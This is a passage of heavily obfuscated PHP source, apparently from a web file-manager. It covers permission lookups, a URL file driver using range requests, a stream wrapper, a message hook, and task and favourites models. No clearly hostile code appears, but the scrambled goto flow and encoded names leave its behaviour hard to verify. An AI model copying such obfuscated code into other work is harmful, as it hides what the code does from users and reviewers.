$b²ØƒÁ×Õæ[$E¶‰Ë–­]; goto D›Îõ¹£á; F‡Ïò—™Ù: $BˆºñÍ®µ› = $GLOBALS[$fùËëÔ†Ï…[6]][$fùËëÔ†Ï…[84]][$fùËëÔ†Ï…[1739]] == 1; $Cƒ»¨ŸºåÛ = $BˆºñÍ®µ› ? 3 : 2; foreach ($f‚ÂøÅ¶¿ğ as $cŸô‘çå¦ä) { $CÂ¿Ù‹³ì = array($cŸô‘çå¦ä[$fùËëÔ†Ï…[1644]]); $b·ÊÚÃ‡ö¸ = explode($fùËëÔ†Ï…[47], trim($cŸô‘çå¦ä[$fùËëÔ†Ï…[476]], $fùËëÔ†Ï…[47])); if ($b·ÊÚÃ‡ö¸[0] == $fùËëÔ†Ï…[485] && count($b·ÊÚÃ‡ö¸) > $Cƒ»¨ŸºåÛ) { $FÍŒö›§‡¾ = array_slice($b·ÊÚÃ‡ö¸, $Cƒ»¨ŸºåÛ); $CÂ¿Ù‹³ì = array_merge($CÂ¿Ù‹³ì, array_reverse($FÍŒö›§‡¾)); } $B¯Å‘ñˆ = array_merge($B¯Å‘ñˆ, $CÂ¿Ù‹³ì); } goto C¾ìƒñÖ•; dĞ¦ƒÁÉ‡: if (isset($b²ØƒÁ×Õæ[$E¶‰Ë–­])) { return $b²ØƒÁ×Õæ[$E¶‰Ë–­]; } $f‚ÂøÅ¶¿ğ = $this->userGroupList($E¶‰Ë–­); $B¯Å‘ñˆ = array(); goto F‡Ïò—™Ù; FÜä§‹›ßŸ: $fùËëÔ†Ï… =& $_SERVER[úÎü]; static $b²ØƒÁ×Õæ = array(); $E¶‰Ë–­ = $E¶‰Ë–­ ? $E¶‰Ë–­ : USER_ID; goto dĞ¦ƒÁÉ‡; D›Îõ¹£á: } public function authTargetInfoMake($aœ…£Å¶ÒÃ) { goto a‡Œå—Úµ‰; fšäèËÊó½: return array($B¡¨ŒÍœµ‹[1849] => $fƒÖÂ”Ô¥“, $B¡¨ŒÍœµ‹[1850] => $B÷æùñƒ); goto c„ÈÄáŠ¨…; a‡Œå—Úµ‰: $B¡¨ŒÍœµ‹ =& $_SERVER[úÎü]; $fƒÖÂ”Ô¥“ = array(); $B÷æùñƒ = array(); goto dÓ×ÀóùĞ§; dÓ×ÀóùĞ§: foreach ($aœ…£Å¶ÒÃ as $BÁ¡âÔçé) { if ($BÁ¡âÔçé[$B¡¨ŒÍœµ‹[387]] == SourceModel::TYPE_USER) { $fƒÖÂ”Ô¥“[] = intval($BÁ¡âÔçé[$B¡¨ŒÍœµ‹[473]]); } else { if ($BÁ¡âÔçé[$B¡¨ŒÍœµ‹[387]] == SourceModel::TYPE_GROUP) { $B÷æùñƒ[] = intval($BÁ¡âÔçé[$B¡¨ŒÍœµ‹[473]]); } } } if ($fƒÖÂ”Ô¥“) { $fƒÖÂ”Ô¥“ = Model($B¡¨ŒÍœµ‹[491])->userListInfo($fƒÖÂ”Ô¥“); } if ($B÷æùñƒ) { $e·ãòÄ”‘ = array($B¡¨ŒÍœµ‹[1725] => array($B¡¨ŒÍœµ‹[400], $B÷æùñƒ)); $B÷æùñƒ = Model($B¡¨ŒÍœµ‹[475])->field($B¡¨ŒÍœµ‹[1738])->where($e·ãòÄ”‘)->select(); $B÷æùñƒ = array_to_keyvalue($B÷æùñƒ, $B¡¨ŒÍœµ‹[1644]); } goto fšäèËÊó½; c„ÈÄáŠ¨…: } public function authInfo($bÌÎ×°¸µ‹) { $d†· •”ç¦ =& $_SERVER[úÎü]; if ($bÌÎ×°¸µ‹[$d†· •”ç¦[1793]]) { $A®–ÜÂ…‰ = Model($d†· •”ç¦[1813])->listData($bÌÎ×°¸µ‹[$d†· •”ç¦[1793]]); if (!$A®–ÜÂ…‰) { return !1; $D¿Í§æè¡¶ = Model($d†· •”ç¦[1813])->listData(); $dÛ³ä¨¦ì‹ = array_filter_by_field($D¿Í§æè¡¶, $d†· •”ç¦[392], $d†· •”ç¦[485]); return $dÛ³ä¨¦ì‹; } $CÄ˜ñÀ¸¾Ü = array_field_key($A®–ÜÂ…‰, array($d†· •”ç¦[383], $d†· •”ç¦[28], $d†· •”ç¦[392], $d†· •”ç¦[1665], $d†· •”ç¦[1667])); $CÄ˜ñÀ¸¾Ü[$d†· •”ç¦[1851]] = $bÌÎ×°¸µ‹; return $CÄ˜ñÀ¸¾Ü; } else { return array($d†· •”ç¦[401] => 0, $d†· •”ç¦[1650] => $bÌÎ×°¸µ‹[$d†· •”ç¦[1794]], $d†· •”ç¦[402] => $d†· •”ç¦[33], $d†· •”ç¦[1665] => $d†· •”ç¦[1852]); } } } goto FÓÍ›ä÷óˆ; F§Õ±ĞÄÆ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($bÂÍ™©» = false) { } public function exist($C¤âÖƒâ‰°) { $eŞÄ¶ÀçŸ = $this->info($C¤âÖƒâ‰°); return $eŞÄ¶ÀçŸ[$_SERVER[úÎü][191]]; } public function isFile($f†½‚Ñô¢Œ) { $Bèå…Å©ö£ = $this->info($f†½‚Ñô¢Œ); return $Bèå…Å©ö£[$_SERVER[úÎü][191]]; } public function isFolder($a‚Õ–˜öö) { return !1; } public function size($Fññ½„ŠÀ„) { $Aùé¸¥Î×é = $this->info($Fññ½„ŠÀ„); return $Aùé¸¥Î×é[$_SERVER[úÎü][77]]; } public function info($Dê‘éÍŠ‘õ) { return $this->infoParse($Dê‘éÍŠ‘õ); } public function infoAuth($E¢½ùïë“É) { return $this->infoParse($E¢½ùïë“É); } public function infoWithChildren($C¶ĞòÓˆ–«) { return $this->infoParse($C¶ĞòÓˆ–«); } public function infoFull($Dº›æÜ¿”Ë) { return $this->infoParse($Dº›æÜ¿”Ë); } private function infoParse($B¤î»İòŞñ) { $a‘š“éÀ«É =& $_SERVER[úÎü]; $e¶Ö“™àè = $this->header($B¤î»İòŞñ); if (!$e¶Ö“™àè || !$e¶Ö“™àè[$a‘š“éÀ«É[690]]) { return !1; } $aöãì…É = _get($e¶Ö“™àè, $a‘š“éÀ«É[331], 0); $A–Ë­ß‡ = array($a‘š“éÀ«É[28] => $e¶Ö“™àè[$a‘š“éÀ«É[28]], $a‘š“éÀ«É[75] => $B¤î»İòŞñ, $a‘š“éÀ«É[29] => $a‘š“éÀ«É[171], $a‘š“éÀ«É[77] => intval($aöãì…É), $a‘š“éÀ«É[165] => get_path_ext($e¶Ö“™àè[$a‘š“éÀ«É[28]]), $a‘š“éÀ«É[1211] => $aöãì…É > 0 && $e¶Ö“™àè[$a‘š“éÀ«É[1332]], $a‘š“éÀ«É[1212] => !1); return $A–Ë­ß‡; } private function header($dÏ¶¡‡×Åé) { goto e‡ßŒ±è¦ö; e‡ßŒ±è¦ö: $F‘¾öªÈÅ =& $_SERVER[úÎü]; if (isset(self::$_cacheHeader[$dÏ¶¡‡×Åé])) { return self::$_cacheHeader[$dÏ¶¡‡×Åé]; } $f°ê¥Ç¢¸ = isset($GLOBALS[$F‘¾öªÈÅ[1333]]) ? $GLOBALS[$F‘¾öªÈÅ[1333]] : !1; goto aáÀîğÊßÑ; aáÀîğÊßÑ: $GLOBALS[$F‘¾öªÈÅ[1333]] = !0; self::$_cacheHeader[$dÏ¶¡‡×Åé] = url_header($dÏ¶¡‡×Åé); $GLOBALS[$F‘¾öªÈÅ[1333]] = $f°ê¥Ç¢¸; goto Dìè˜¨»; Dìè˜¨»: return self::$_cacheHeader[$dÏ¶¡‡×Åé]; goto AÕ—·Ëèã÷; AÕ—·Ëèã÷: } public function hashSimple($a‘±œĞŸ², $fŒ‰êğ–¥ = false) { goto a²ŠàÈ; a²ŠàÈ: $D¥¹¿ÎƒÎ =& $_SERVER[úÎü]; $E–Ñá¹ïÙ = $this->info($a‘±œĞŸ²); if (!$E–Ñá¹ïÙ || !$E–Ñá¹ïÙ[$D¥¹¿ÎƒÎ[191]]) { return !1; } goto bÊÊÌå¼; bØªÀ¾ğô‚: if ($FŠ‚’ê‰Ã¾ <= $CĞ‡£§çÎ * $C—Éßô›½Á) { return md5($this->fileSubstr($a‘±œĞŸ², 0, $FŠ‚’ê‰Ã¾)) . $FŠ‚’ê‰Ã¾; } $e‰°”Êš³Ë = intval($FŠ‚’ê‰Ã¾ / $C—Éßô›½Á); $EîÂáË¥ = $D¥¹¿ÎƒÎ[33]; goto dø™ÆÄŞ¦£; Bà†ÎœÂ‚À: $EîÂáË¥ .= $this->fileSubstr($a‘±œĞŸ², $FŠ‚’ê‰Ã¾ - $CĞ‡£§çÎ, $CĞ‡£§çÎ); return md5($EîÂáË¥) . $FŠ‚’ê‰Ã¾; goto F²ä‡„‘İõ; bÊÊÌå¼: $FŠ‚’ê‰Ã¾ = $E–Ñá¹ïÙ[$D¥¹¿ÎƒÎ[77]]; $CĞ‡£§çÎ = 200; $C—Éßô›½Á = 50; goto bØªÀ¾ğô‚; dø™ÆÄŞ¦£: $aÌÙá´›‡Î = timeFloat(); $aó‰î½Ãç = 15; for ($aÓ‹‰²¨šÉ = 0; $aÓ‹‰²¨šÉ < $C—Éßô›½Á; $aÓ‹‰²¨šÉ++) { if (timeFloat() - $aÌÙá´›‡Î > $aó‰î½Ãç) { return !1; } $C‰¾‹ª‡Ğ¾ = $this->fileSubstr($a‘±œĞŸ², $e‰°”Êš³Ë * $aÓ‹‰²¨šÉ, $CĞ‡£§çÎ); if (!$C‰¾‹ª‡Ğ¾) { return !1; } $EîÂáË¥ .= $C‰¾‹ª‡Ğ¾; } goto Bà†ÎœÂ‚À; F²ä‡„‘İõ: } public function getContent($céÆª»ì) { return $this->fileSubstr($céÆª»ì); } public function fileSubstr($eÜñíÚÙ, $d…Öä‚ÀÒ‡ = 0, $f°¥¾ßò© = -1) { goto dÔğ’½µº§; aäÀ¾¦ù„: if ($f°¥¾ßò© === -1) { $f°¥¾ßò© = $B½²¡Ï¨´[$f«‚ìæäáÏ[77]]; } if ($f°¥¾ßò© == 0) { return $f«‚ìæäáÏ[33]; } $E—Ó•¥¿½‰ = array($f«‚ìæäáÏ[1334] . $d…Öä‚ÀÒ‡ . $f«‚ìæäáÏ[716] . ($d…Öä‚ÀÒ‡ + $f°¥¾ßò© - 1)); goto Eœ•ö˜¸™œ; Eœ•ö˜¸™œ: $CÒ×®ÍŠš¸ = url_request($eÜñíÚÙ, $f«‚ìæäáÏ[224], !1, $E—Ó•¥¿½‰, !1, !1, 1); return $CÒ×®ÍŠš¸[$f«‚ìæäáÏ[1048]] ? $CÒ×®ÍŠš¸[$f«‚ìæäáÏ[1048]] : $f«‚ìæäáÏ[33]; goto dÄâõŸÛ ‘; dÔğ’½µº§: $f«‚ìæäáÏ =& $_SERVER[úÎü]; $B½²¡Ï¨´ = $this->info($eÜñíÚÙ); if (!$B½²¡Ï¨´ || !$B½²¡Ï¨´[$f«‚ìæäáÏ[191]] && $B½²¡Ï¨´[$f«‚ìæäáÏ[77]] > 1024 * 1024 * 10) { return !1; } goto aäÀ¾¦ù„; dÄâõŸÛ ‘: } public function download($eÎÉ±™±µ•, $câ£ÇŞ¦Ó) { Downloader::start($eÎÉ±™±µ•, $câ£ÇŞ¦Ó); return $câ£ÇŞ¦Ó; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($Béõ¡²³ŞÃ, $Då«éë©Æ» = '') { goto fç¡åÙÙ­; aÓĞÇéºÕˆ: return $this->info ? !0 : !1; goto cÛÉ…É÷¹£; D›ç¼âÔİ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$Béõ¡²³ŞÃ])) { self::$_chunkBuffer[$Béõ¡²³ŞÃ] = array(); } goto aÓĞÇéºÕˆ; fç¡åÙÙ­: $this->info = $this->info($Béõ¡²³ŞÃ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[úÎü][75]]; goto D›ç¼âÔİ; cÛÉ…É÷¹£: } function stream_read($aŞë¬íˆÉ) { $ešñƒÆø·Ù = $this->fileSubstr($this->pose, $aŞë¬íˆÉ); $this->pose += strlen($ešñƒÆø·Ù); return $ešñƒÆø·Ù; } public function stream_tell() { return $this->pose; } public function stream_seek($a¥Öóî¥ˆ, $Bîãù´öÔ†) { $C¦ªçïßˆ =& $_SERVER[úÎü]; if ($Bîãù´öÔ† == SEEK_SET) { $this->pose = $a¥Öóî¥ˆ; } else { if ($Bîãù´öÔ† == SEEK_CUR) { $this->pose += $a¥Öóî¥ˆ; } else { if ($Bîãù´öÔ† == SEEK_END) { $this->pose = $this->info[$C¦ªçïßˆ[77]] + intval($a¥Öóî¥ˆ); } } } if ($a¥Öóî¥ˆ < 0) { $this->pose = $this->info[$C¦ªçïßˆ[77]] + $a¥Öóî¥ˆ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[úÎü][77]]; } public function stream_close() { return !0; } public function url_stat($EÑÃ³×öä, $d—„¶æöŞ×) { $DÉå…Ü´Ï‘ =& $_SERVER[úÎü]; $fæëÁ‘óõ† = $this->info($EÑÃ³×öä); return array($DÉå…Ü´Ï‘[1335] => 0, $DÉå…Ü´Ï‘[1336] => 0, $DÉå…Ü´Ï‘[12] => 32768 + 511, $DÉå…Ü´Ï‘[1337] => 0, $DÉå…Ü´Ï‘[1338] => 0, $DÉå…Ü´Ï‘[1339] => 0, $DÉå…Ü´Ï‘[1340] => 0, $DÉå…Ü´Ï‘[77] => $fæëÁ‘óõ†[$DÉå…Ü´Ï‘[77]], $DÉå…Ü´Ï‘[1341] => $fæëÁ‘óõ†[$DÉå…Ü´Ï‘[1210]], $DÉå…Ü´Ï‘[1297] => $fæëÁ‘óõ†[$DÉå…Ü´Ï‘[107]], $DÉå…Ü´Ï‘[1296] => $fæëÁ‘óõ†[$DÉå…Ü´Ï‘[190]], $DÉå…Ü´Ï‘[1342] => 0, $DÉå…Ü´Ï‘[1343] => 0); } static $fileInfo = array(); public function info($d¹Ç‰Ö©œò) { $aÈŠ¼‚¬Œ = $_SERVER[úÎü][1344]; if (isset(self::$fileInfo[$d¹Ç‰Ö©œò])) { return self::$fileInfo[$d¹Ç‰Ö©œò]; } if (substr($d¹Ç‰Ö©œò, 0, strlen($aÈŠ¼‚¬Œ)) != $aÈŠ¼‚¬Œ) { return !1; } self::$fileInfo[$d¹Ç‰Ö©œò] = IO::info(substr($d¹Ç‰Ö©œò, strlen($aÈŠ¼‚¬Œ))); return self::$fileInfo[$d¹Ç‰Ö©œò]; } public static function read($c×ô‚ÒîĞí, $FÄ‚«¸ƒã, $d‹ÚøÄÄº) { goto BÉÍ”Ìèãó; bí¬øğÛÁ: $f› ö¬Ä¥ = 8192; fseek($cÌÒôÚ´Š¢, $FÄ‚«¸ƒã, SEEK_SET); $aâŒ„ŞÏø‰ = $FŠ»¸¿ÑŠŒ[33]; goto f™êĞ×Ÿñ´; BÉÍ”Ìèãó: $FŠ»¸¿ÑŠŒ =& $_SERVER[úÎü]; $cÌÒôÚ´Š¢ = fopen($c×ô‚ÒîĞí, $FŠ»¸¿ÑŠŒ[1214]); if (!$cÌÒôÚ´Š¢) { return $FŠ»¸¿ÑŠŒ[33]; } goto bí¬øğÛÁ; d¦À÷¿ëÎ…: return $aâŒ„ŞÏø‰; goto e¾Âõç±™; f™êĞ×Ÿñ´: $a…ï‘Úğ¾ = 0; while ($a…ï‘Úğ¾ < $d‹ÚøÄÄº) { $Eåç«‚öƒ = min($f› ö¬Ä¥, $d‹ÚøÄÄº - $a…ï‘Úğ¾); $aâŒ„ŞÏø‰ .= fread($cÌÒôÚ´Š¢, $Eåç«‚öƒ); $a…ï‘Úğ¾ += $Eåç«‚öƒ; } fclose($cÌÒôÚ´Š¢); goto d¦À÷¿ëÎ…; e¾Âõç±™: } public function fileSubstr($FÒÂÙò¤Ú¸, $aª­èÕäÉŞ) { goto FÎ³Ö¦”š°; cÔ‹ôê»Ì: $e¹ğ‡¶Œ³‰ = 64 * 1024; $D¨ÀÀÏùåò =& self::$_chunkBuffer[$this->path]; if (!$D¨ÀÀÏùåò) { $D¨ÀÀÏùåò = array(); } goto d×‚¾¡…¦Ğ; dçŞàœÁ°à: $bí™Ùßš… = $aª­èÕäÉŞ; if ($FÒÂÙò¤Ú¸ < 0) { $FÒÂÙò¤Ú¸ = $dÅÖä­‘ë¹ + $FÒÂÙò¤Ú¸; } if ($aª­èÕäÉŞ === !1) { $aª­èÕäÉŞ = $dÅÖä­‘ë¹ - $FÒÂÙò¤Ú¸; } goto dˆÛ¾ô¡Îí; FÎ³Ö¦”š°: $Aß‚ÄŠÂõ’ =& $_SERVER[úÎü]; $dÅÖä­‘ë¹ = $this->info[$Aß‚ÄŠÂõ’[77]]; $c“ˆ¨Œø°² = $FÒÂÙò¤Ú¸; goto dçŞàœÁ°à; A¢Î×‹ ‹ã: ksort($D¨ÀÀÏùåò); $eµ¾´ŒÎÖ = substr($A†àÍº¨Ï®, $FÒÂÙò¤Ú¸ - $F´©¦Ì‘, $aª­èÕäÉŞ); return $eµ¾´ŒÎÖ; goto EÏ¸è²˜¾; dˆÛ¾ô¡Îí: if ($FÒÂÙò¤Ú¸ + $aª­èÕäÉŞ > $dÅÖä­‘ë¹) { $aª­èÕäÉŞ = $dÅÖä­‘ë¹ - $FÒÂÙò¤Ú¸; } if ($aª­èÕäÉŞ <= 0) { return $Aß‚ÄŠÂõ’[33]; } if ($FÒÂÙò¤Ú¸ < 0 || $FÒÂÙò¤Ú¸ >= $dÅÖä­‘ë¹ || $aª­èÕäÉŞ <= 0 || $aª­èÕäÉŞ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\151\x6c\145\x52\x65\141\144\x20\145\x72\162\x6f\x72\41\x20\x73\x74\x61\162\x74\x3d{$FÒÂÙò¤Ú¸}\x3b\154\x65\x6e\x67\164\x68\75{$aª­èÕäÉŞ}\x3b\40\163\151\x7a\145\75{$dÅÖä­‘ë¹}\73"); } goto cÔ‹ôê»Ì; d×‚¾¡…¦Ğ: $Dª¡‚ˆ§‹ô = 0; $D‰™Ûå‹­¦ = 0; $fË¥ùËÙÂ = $Aß‚ÄŠÂõ’[33]; goto f¢èÇ‡÷òõ; E ©µÆ»âä: $dëÓØåœÑ‡ = ceil(($FÒÂÙò¤Ú¸ + $aª­èÕäÉŞ) / $e¹ğ‡¶Œ³‰) * $e¹ğ‡¶Œ³‰ - $F´©¦Ì‘; $A†àÍº¨Ï® = IO::fileSubstr($this->path, $F´©¦Ì‘, $dëÓØåœÑ‡); $D¨ÀÀÏùåò[$F´©¦Ì‘ . $Aß‚ÄŠÂõ’[33]] = $A†àÍº¨Ï®; goto A¢Î×‹ ‹ã; f¢èÇ‡÷òõ: foreach ($D¨ÀÀÏùåò as $Dª¡‚ˆ§‹ô => $fË¥ùËÙÂ) { $Dª¡‚ˆ§‹ô = intval($Dª¡‚ˆ§‹ô); $D‰™Ûå‹­¦ = $Dª¡‚ˆ§‹ô + strlen($fË¥ùËÙÂ); if ($FÒÂÙò¤Ú¸ >= $D‰™Ûå‹­¦) { continue; } if ($FÒÂÙò¤Ú¸ >= $Dª¡‚ˆ§‹ô && $FÒÂÙò¤Ú¸ + $aª­èÕäÉŞ <= $D‰™Ûå‹­¦) { return substr($fË¥ùËÙÂ, $FÒÂÙò¤Ú¸ - $Dª¡‚ˆ§‹ô, $aª­èÕäÉŞ); } break; } if (count($D¨ÀÀÏùåò) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($Aß‚ÄŠÂõ’[1345], $Aß‚ÄŠÂõ’[1346] . count($D¨ÀÀÏùåò) . "\x3b\163\x74\x61\162\x74\75{$FÒÂÙò¤Ú¸}\54\x6c\145\156\147\164\x68\x3d{$aª­èÕäÉŞ}\73\160\x6f\163\x65\x3a{$Dª¡‚ˆ§‹ô}\176{$D‰™Ûå‹­¦}"); throw new Exception($Aß‚ÄŠÂõ’[1347]); } $F´©¦Ì‘ = intval($FÒÂÙò¤Ú¸ / $e¹ğ‡¶Œ³‰) * $e¹ğ‡¶Œ³‰; goto E ©µÆ»âä; EÏ¸è²˜¾: } private function log($FÍİ²¿‚Ÿ÷, $cÜä…äËÊ) { $dñê¿Šºñà =& $_SERVER[úÎü]; $B¨ÉŒ¨Š› = timeFloat() - $this->timeStart; write_log(sprintf($dñê¿Šºñà[1348], $FÍİ²¿‚Ÿ÷, $this->info[$dñê¿Šºñà[28]], $B¨ÉŒ¨Š›, $cÜä…äËÊ), $dñê¿Šºñà[1038]); } } class Message { function __construct() { } public function send($d•ø‘ÜÆ = '', $Fî·¥‚òâ = array(), $f²„šÉ‰Ò” = "\x74\x65\170\x74") { goto C®õù±ÌÃ; B´¡Ä ¼Êã: Hook::trigger($E²†ŸøîÕô[1352], $F’áÍ­Ú¼ğ); goto BÒéÔëìßš; eùĞİõ¡‡£: $Fî·¥‚òâ = array($E²†ŸøîÕô[976] => isset($Fî·¥‚òâ[$E²†ŸøîÕô[976]]) ? $Fî·¥‚òâ[$E²†ŸøîÕô[976]] : $E²†ŸøîÕô[33], $E²†ŸøîÕô[551] => isset($Fî·¥‚òâ[$E²†ŸøîÕô[551]]) ? $Fî·¥‚òâ[$E²†ŸøîÕô[551]] : $E²†ŸøîÕô[33]); if (empty($d•ø‘ÜÆ) || empty($Fî·¥‚òâ[$E²†ŸøîÕô[976]]) && empty($Fî·¥‚òâ[$E²†ŸøîÕô[551]])) { return !1; } $F’áÍ­Ú¼ğ = array($E²†ŸøîÕô[1290] => $Fºª·õ‘ñç, $E²†ŸøîÕô[1351] => $Fî·¥‚òâ); goto B´¡Ä ¼Êã; C®õù±ÌÃ: $E²†ŸøîÕô =& $_SERVER[úÎü]; $Fºª·õ‘ñç = array($E²†ŸøîÕô[29] => $E²†ŸøîÕô[1349], $E²†ŸøîÕô[693] => $d•ø‘ÜÆ); if (in_array($f²„šÉ‰Ò”, array($E²†ŸøîÕô[1349], $E²†ŸøîÕô[1350]))) { $Fºª·õ‘ñç[$E²†ŸøîÕô[29]] = $f²„šÉ‰Ò”; } goto eùĞİõ¡‡£; BÒéÔëìßš: } } goto Aî‹´ é©ò; B×·†ìíôÜ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\164\141\x73\153\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\164\171\x70\x65", "\145\x76\145\x6e\164", "\x74\x69\x6d\x65", "\x64\145\163\143", "\x73\171\x73\164\x65\155", "\145\x6e\x61\x62\154\x65", "\x6c\x61\x73\x74\122\x75\156", "\x73\157\x72\164"); public function listData($D¡È¡ßç‹ = false, $dš‰‚–Ùïí = "\163\x6f\162\164", $a†—ßíñ–• = false) { return parent::listData($D¡È¡ßç‹, $dš‰‚–Ùïí, $a†—ßíñ–•); } public function add($A‚ÂÇ ‚Ñ¦) { $F¸»÷ÏßŠ =& $_SERVER[úÎü]; $bÛ®ÎÉ‰ÚŸ = $this->findByName($A‚ÂÇ ‚Ñ¦[$F¸»÷ÏßŠ[28]]); if ($bÛ®ÎÉ‰ÚŸ) { return !1; } $A‚ÂÇ ‚Ñ¦[$F¸»÷ÏßŠ[1449]] = 0; $A‚ÂÇ ‚Ñ¦[$F¸»÷ÏßŠ[1667]] = $this->getSort(); return parent::insert($A‚ÂÇ ‚Ñ¦); } private function getSort() { $bİÇ‡ó¶ñÚ =& $_SERVER[úÎü]; $a±‡ÉÑ„Õ• = parent::listData(); $d•µ±¨ğà® = array_to_keyvalue($a±‡ÉÑ„Õ•, $bİÇ‡ó¶ñÚ[33], $bİÇ‡ó¶ñÚ[1667]); return empty($d•µ±¨ğà®) ? 0 : max($d•µ±¨ğà®) + 1; } public function update($FçÅä¦à, $EÔªëŞ¤è) { $aÙ÷íìêšà =& $_SERVER[úÎü]; $a›¦‰ ï• = $this->listData($FçÅä¦à); $C¨œßŞ‡¸Ç = $this->findByName($EÔªëŞ¤è[$aÙ÷íìêšà[28]]); if (!$a›¦‰ ï• || $C¨œßŞ‡¸Ç && $C¨œßŞ‡¸Ç[$aÙ÷íìêšà[383]] != $a›¦‰ ï•[$aÙ÷íìêšà[383]]) { return !1; } return parent::update($FçÅä¦à, $EÔªëŞ¤è); } public function remove($EÑ¹èù™ï, $E¨»„öìÕ = false) { $EÚéÁäïŞÜ =& $_SERVER[úÎü]; $D±°ÛøÒ¥ = $this->listData($EÑ¹èù™ï); if (!$D±°ÛøÒ¥) { return; } if (!$E¨»„öìÕ && $D±°ÛøÒ¥[$EÚéÁäïŞÜ[1126]] == $EÚéÁäïŞÜ[83]) { return !1; } return parent::remove($EÑ¹èù™ï); } public function enable($FÛôÕ—¾ñ×, $E¾Ê×§Æ‘¥) { return $this->update($FÛôÕ—¾ñ×, array($_SERVER[úÎü][2047] => $E¾Ê×§Æ‘¥)); } public function run($C±Ê¤†—š) { return $this->update($C±Ê¤†—š, array($_SERVER[úÎü][2057] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($AĞÆİöñ°ò) { $a¢–ËÏÙ¡ =& $_SERVER[úÎü]; return array($a¢–ËÏÙ¡[1744] => array(USER_ID, $a¢–ËÏÙ¡[2058])); } protected function listData() { $Cç½ŠÏÊî =& $_SERVER[úÎü]; $bÂ¨Àèİ‹Š = array($Cç½ŠÏÊî[1477] => USER_ID, $Cç½ŠÏÊî[451] => 0); $E‹‹ôÑ’Ÿ = $Cç½ŠÏÊî[2059]; $Eö±˜©”É = $this->field($E‹‹ôÑ’Ÿ)->where($bÂ¨Àèİ‹Š)->order($Cç½ŠÏÊî[2060])->select(); return $Eö±˜©”É ? $Eö±˜©”É : array(); } protected function resetCache() { } protected function listView() { goto D‡³°±ó›©; bÍùÓÎ‘êè: $b¿™Ôì—²ù = array($e»ÕËŒ±Ö™[399] => array($e»ÕËŒ±Ö™[400], $AÙ‹Ôğ™Ìï)); $Eš•Š•¨¨Ô = Model($e»ÕËŒ±Ö™[752])->listSource($b¿™Ôì—²ù, $BË‘õê‘é); $Eš•Š•¨¨Ô = array_merge($Eš•Š•¨¨Ô[$e»ÕËŒ±Ö™[73]], $Eš•Š•¨¨Ô[$e»ÕËŒ±Ö™[74]]); goto cªÖâä£ºŒ; D‡³°±ó›©: $e»ÕËŒ±Ö™ =& $_SERVER[úÎü]; $CÜ°†êî­İ = $this->listData(); $bò˜¥¶šø“ = array_filter_by_field($CÜ°†êî­İ, $e»ÕËŒ±Ö™[29], $e»ÕËŒ±Ö™[398]); goto CŠÄò‰…²£; cªÖâä£ºŒ: $Eš•Š•¨¨Ô = array_to_keyvalue($Eš•Š•¨¨Ô, $e»ÕËŒ±Ö™[385]); foreach ($CÜ°†êî­İ as $E—Ó»×ÀÎİ => $f İ‰ö„ºß) { $AØè“‘š½” = $Eš•Š•¨¨Ô[$f İ‰ö„ºß[$e»ÕËŒ±Ö™[75]]]; $AØè“‘š½” = $AØè“‘š½” ? $AØè“‘š½” : array(); $CÜ°†êî­İ[$E—Ó»×ÀÎİ] = array_merge($AØè“‘š½”, $f İ‰ö„ºß); } return $CÜ°†êî­İ; goto eÍ‰Š˜¤¾¾; CŠÄò‰…²£: $AÙ‹Ôğ™Ìï = array_to_keyvalue($bò˜¥¶šø“, $e»ÕËŒ±Ö™[33], $e»ÕËŒ±Ö™[75]); if (!$AÙ‹Ôğ™Ìï) { return $CÜ°†êî­İ; } $BË‘õê‘é = 2000; goto bÍùÓÎ‘êè; eÍ‰Š˜¤¾¾: } protected function addFav($C…¿ŒËŠ¡¢, $Aã¸ªŞ¼®ò = '', $AíÓ«ôĞìô = "\x73\157\x75\162\x63\x65") { goto A¨¼øäÇ½²; Bš‘¶ñğ»à: return $this->add($bŞìÂĞÏÓ); goto B•­Ç™é‘©; e¯ÙºÁ¤ÎÖ: if (!$Aã¸ªŞ¼®ò && $AíÓ«ôĞìô == $Bº“ºåó•[398]) { $dçæ‡¬·« = Model($Bº“ºåó•[1162])->where(array($Bº“ºåó•[399] => $C…¿ŒËŠ¡¢))->find(); if (!$dçæ‡¬·«) { return !1; } $Aã¸ªŞ¼®ò = $dçæ‡¬·«[$Bº“ºåó•[28]]; } $Aã¸ªŞ¼®ò = $this->getAutoName($Aã¸ªŞ¼®ò); $bŞìÂĞÏÓ = array($Bº“ºåó•[1477] => USER_ID, $Bº“ºåó•[451] => 0, $Bº“ºåó•[402] => $Aã¸ªŞ¼®ò, $Bº“ºåó•[403] => $C…¿ŒËŠ¡¢, $Bº“ºåó•[404] => $AíÓ«ôĞìô, $Bº“ºåó•[1648] => $eØŸÙ—ª°Ò + 1); goto Bš‘¶ñğ»à; A¨¼øäÇ½²: $Bº“ºåó• =& $_SERVER[úÎü]; $d«—ô‡†² = array($Bº“ºåó•[1477] => USER_ID, $Bº“ºåó•[451] => 0, $Bº“ºåó•[404] => $AíÓ«ôĞìô, $Bº“ºåó•[403] => $C…¿ŒËŠ¡¢); if ($this->where($d«—ô‡†²)->find()) { return !1; } goto B¢Â„â‚øÅ; B¢Â„â‚øÅ: $d«—ô‡†² = array($Bº“ºåó•[1477] => USER_ID, $Bº“ºåó•[451] => 0); $eØŸÙ—ª°Ò = $this->where($d«—ô‡†²)->max($Bº“ºåó•[1667]); if (!$eØŸÙ—ª°Ò) { $eØŸÙ—ª°Ò = 0; } goto e¯ÙºÁ¤ÎÖ; B•­Ç™é‘©: } protected function remove($bäÄ°¤…«) { $a†ÛãÚ‚ =& $_SERVER[úÎü]; $CÜÙÏù›¯° = array($a†ÛãÚ‚[1477] => USER_ID, $a†ÛãÚ‚[401] => $bäÄ°¤…«); return $this->where($CÜÙÏù›¯°)->delete(); } protected function removeByName($B§ğ¸Á±¶¯) { $C·òåôğôœ =& 